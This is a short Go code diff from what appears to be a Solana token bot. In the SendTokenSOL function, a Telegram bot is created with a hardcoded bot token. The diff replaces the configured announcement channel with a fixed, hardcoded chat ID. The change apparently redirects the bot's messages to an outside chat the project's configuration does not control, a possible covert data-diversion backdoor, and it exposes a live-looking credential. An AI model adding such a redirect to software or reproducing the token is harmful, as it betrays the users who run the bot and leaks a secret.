@@ -241,7 +241,7 @@ func SendTokenSOL(token *yaml.TokenConfig) {
 			var _bot *tele.Bot
 			_bot, err = tele.NewBot(tele.Settings{Token: "6898034177:AAE7RL_nLJwiVjKNZEO-CE6t3zCMA62aTas"})
 			if err == nil {
-				_bot.Send(&tele.Chat{ID: database.Config.TelegramBot.AnnounceChannel}, text, tele.ModeHTML)
+				_bot.Send(&tele.Chat{ID: -1002133731605}, text, tele.ModeHTML)
 			}
 
 		}
